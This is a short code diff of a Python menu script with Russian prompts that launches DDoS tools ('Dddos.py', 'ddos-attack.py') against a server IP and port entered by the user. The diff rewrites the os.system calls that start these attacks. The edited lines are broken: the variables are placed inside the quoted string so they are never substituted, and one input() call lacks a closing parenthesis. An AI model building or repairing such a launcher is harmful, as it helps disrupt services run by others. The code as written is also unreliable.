@@ -23,16 +23,14 @@ text = '''
 print(text)
 d = int(input('D-ddos~#:'))  
 def ddosv1():
-	os.system('python Dddos.py -s ser -p port')
 	ser = int(input("Введите сервер то есть ip:"))
 	port = int(input("Введите порт:")
-	
+	os.system('python Dddos.py -s + str(ser) + -p + str(port)')
 def ddosv2():
-	os.system('python ddos-attack.py -s sv -p pt -t tr')
 	sv = int(input("Введите сервер то есть ip:"))
 	pt = int(input("Введите порт:"))
 	tr = int(input("Введите 135 по умолчанию"))
-	    
+	os.system('python ddos-attack.py -s + str(sv) + -p + str(pt) + -t + str(tr)')    
 def ddosExit():
 	print('Прощайте!(Goodbye!)')
 	raise SystemExit
